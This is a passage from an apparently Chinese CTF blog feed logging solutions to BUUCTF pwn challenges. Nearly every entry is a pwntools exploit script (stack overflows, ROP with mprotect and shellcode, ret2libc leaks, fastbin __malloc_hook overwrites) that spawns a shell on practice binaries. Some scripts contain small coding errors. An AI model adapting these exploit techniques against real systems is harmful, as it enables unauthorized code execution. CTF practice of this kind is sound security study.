class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./mulnote'</span>)</span><br><span class="line">elf = ELF(<span class="string">'mulnote'</span>)</span><br><span class="line">lib = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">choice</span><span class="params">(achar)</span>:</span></span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,achar)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">add</span><span class="params">(size,con)</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'C'</span>)</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,str(size))</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'R'</span>)</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'E'</span>)</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,str(idx))</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="comment">########################leak libc#####################</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'1'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'A'</span>)</span><br><span class="line">show()</span><br><span class="line">libc = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-4</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"libc = %s"</span>%hex(libc))</span><br><span class="line">libc_base = libc - <span class="number">0x3c</span></span><br><span class="line">log.success(<span class="string">"libc_base = %s"</span>%hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + lib.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one = libc.base + <span class="number">0x45216</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook<span class="number">-0x23</span>)) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'7'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'x00'</span>*<span class="number">0x13</span>+p64(one)) <span class="comment">#8</span></span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'C'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'size&gt;'</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf pwn的刷题之旅（长期更）</title>
      <link href="/2019/10/18/buuctf%20pwn%E7%9A%84%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%EF%BC%89/"/>
      <url>/2019/10/18/buuctf%20pwn%E7%9A%84%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>在身边人的推荐下，我也踏入了buu的刷题之旅，怀着一丢丢激动，还有些许不安（毕竟菜），在这里记录一下自己的刷题经历</p><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh =remote(<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20035</span>)</span><br><span class="line"><span class="comment">#sh = process('./warmup_csaw_2016')</span></span><br><span class="line"><span class="comment">#elf = ELF('./warmup_casw_2016')</span></span><br><span class="line">libc = ELF(<span class="string">'x64_libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(<span class="number">0x40060d</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./pwn1_sctf_2016')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20086</span>)</span><br><span class="line">payload = <span class="string">'I'</span>*<span class="number">19</span> + <span class="string">"a"</span> * <span class="number">7</span> + p32(<span class="number">0x08048F0D</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>这题，利用mrotect，修改了可执行区域</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./not_the_same_3dsctf_2016')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20007</span>)</span><br><span class="line">elf = ELF(<span class="string">'./not_the_same_3dsctf_2016'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('x86_libc.so.6')</span></span><br><span class="line">pop2 = <span class="number">0x0806fcc9</span></span><br><span class="line">pop3 = <span class="number">0x0809e3e5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2D</span> + p32(elf.symbols[<span class="string">'mprotect'</span>]) </span><br><span class="line">payload += p32(pop3) + p32(<span class="number">0x080EB000</span>) + p32(<span class="number">0x3000</span>)</span><br><span class="line">payload += p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">'read'</span>]) </span><br><span class="line">payload += p32(pop3) + p32(<span class="number">0</span>) + p32(<span class="number">0x080EBF80</span>) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x080EBF80</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>这题的思路呢，和上面not_the_same_3dsctf_2016类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#sh = process("./get_started_3dsctf_2016")</span></span><br><span class="line">sh = remote(<span class="string">"pwn.buuoj.cn"</span>,<span class="number">20004</span>)</span><br><span class="line">elf = ELF(<span class="string">"get_started_3dsctf_2016"</span>)</span><br><span class="line">pop2_ret = <span class="number">0x0809a7dc</span></span><br><span class="line">pop3_ret = <span class="number">0x0804f460</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">56</span> + p32(elf.symbols[<span class="string">'mprotect'</span>]) + p32(pop3_ret) + p32(<span class="number">0x080EB000</span>) + p32(<span class="number">0x3000</span>) + p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0x080EBF80</span>) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x080EBF80</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#input()</span></span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pop_rdi_ret = <span class="number">0x400793</span></span><br><span class="line">bss = <span class="number">0x0000000000601050</span></span><br><span class="line">elf = ELF(<span class="string">"ciscn_2019_n_1"</span>)</span><br><span class="line">sh = remote(<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20137</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(bss)+p64(elf.plt[<span class="string">'gets'</span>])</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(bss)+p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./ciscn_2019_en_2')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20123</span>)</span><br><span class="line">elf = ELF(<span class="string">'ciscn_2019_en_2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">main_addr = <span class="number">0x0000000000400B28</span></span><br><span class="line"><span class="comment">################### leak ####################</span></span><br><span class="line">sh.sendlineafter(<span class="string">'!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x58</span></span><br><span class="line">payload += p64(pop_rdi) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(main_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'puts_addr='</span>+hex(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="comment">###################  shell  #############</span></span><br><span class="line">sh.sendlineafter(<span class="string">'!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x58</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(system_addr) </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./ciscn_2019_c_1')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20115</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">"x64_libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'!'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x50</span>+<span class="number">0x08</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_addr='</span>+hex(puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_addr + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">payload  = <span class="string">"\x00"</span> * (<span class="number">0x50</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h3><p>这题的漏洞点呢，主要在edit的size由你自己决定又因为delete进行了0操作，所以得通过fake，讲一个堆块的指针指到unsoted bin堆块的地方进行读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = remote('pwn.buuoj.cn',20001)</span></span><br><span class="line">sh = process(<span class="string">'./babyheap_0ctf_2017'</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"babyheap_0ctf_2017"</span>)</span><br><span class="line">libc = ELF(<span class="string">"x64_libc.so.6"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"4"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"><span class="comment">############### leak libc_base + malloc_hook#########</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">3</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">3</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base='</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'malloc_hook ='</span> + hex (malloc_hook))</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"><span class="comment">################## </span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#malloc to malloc_hook nearby</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment">#allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4</span></span><br><span class="line"></span><br><span class="line">// edit idx4<span class="string">'s fd point to fake chunk</span></span><br><span class="line"><span class="string">payload = p64(malloc_hook - 35)</span></span><br><span class="line"><span class="string">edit(2,len(payload),payload)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">one_gadget = 0x4526a</span></span><br><span class="line"><span class="string">payload = p8(0) * 3 + p64(0) * 2 + p64(libc_base + one_gadget)</span></span><br><span class="line"><span class="string">edit(6,len(payload),payload)</span></span><br></pre></td></tr></table></figure><h3 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./babyfengshui_33c3_2016')</span></span><br><span class="line">sh = remote(<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20002</span>)</span><br><span class="line">elf = ELF(<span class="string">"babyfengshui_33c3_2016"</span>)</span><br><span class="line">libc = ELF(<span class="string">"x86_libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name_size,name,text_size,text)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"size of description: "</span>)</span><br><span class="line">sh.sendline(str(name_size))</span><br><span class="line">sh.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">sh.sendline(name)</span><br><span class="line">sh.recvuntil(<span class="string">"text length: "</span>)</span><br><span class="line">sh.sendline(str(text_size))</span><br><span class="line">sh.recvuntil(<span class="string">"text:"</span>)</span><br><span class="line">sh.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,text,size)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(<span class="string">"text length: "</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(<span class="string">"text: "</span>)</span><br><span class="line">sh.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'\x11\n'</span>,<span class="number">0x80</span>,<span class="string">'\x12\n'</span>)<span class="comment">#idx 0 </span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x13\n'</span>,<span class="number">0x10</span>,<span class="string">"\x14\n"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x15\x15'</span>,<span class="number">0x10</span>,<span class="string">'\x16\x16'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'/bin/sh\x00'</span>,<span class="number">0x10</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x17\n'</span>,<span class="number">0x160</span>,<span class="number">0x128</span> * <span class="string">'a'</span> + p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span 